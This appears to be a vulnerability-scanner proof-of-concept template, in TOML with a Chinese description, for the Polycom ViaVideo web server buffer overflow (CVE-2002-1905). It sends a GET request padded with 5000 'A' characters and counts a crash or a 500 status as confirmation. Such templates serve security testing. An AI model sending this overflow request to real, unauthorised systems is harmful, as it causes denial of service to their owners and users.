[info]
author = "ave"
description = "通过发送超长 HTTP GET 请求验证 Polycom ViaVideo web 服务器缓冲区溢出漏洞，目标服务应出现崩溃或拒绝服务"
id = "POC-AVE-2002-0722"
name = "Polycom ViaVideo 缓冲区溢出 PoC"
severity = "medium"
tags = ["ave-2002-0722"]
vuln_id = [
    "CVE-2002-1905",
    "AVE-2002-0722",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/{{strrep:repeat:'A':5000}}"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    0,
]
type = "status"
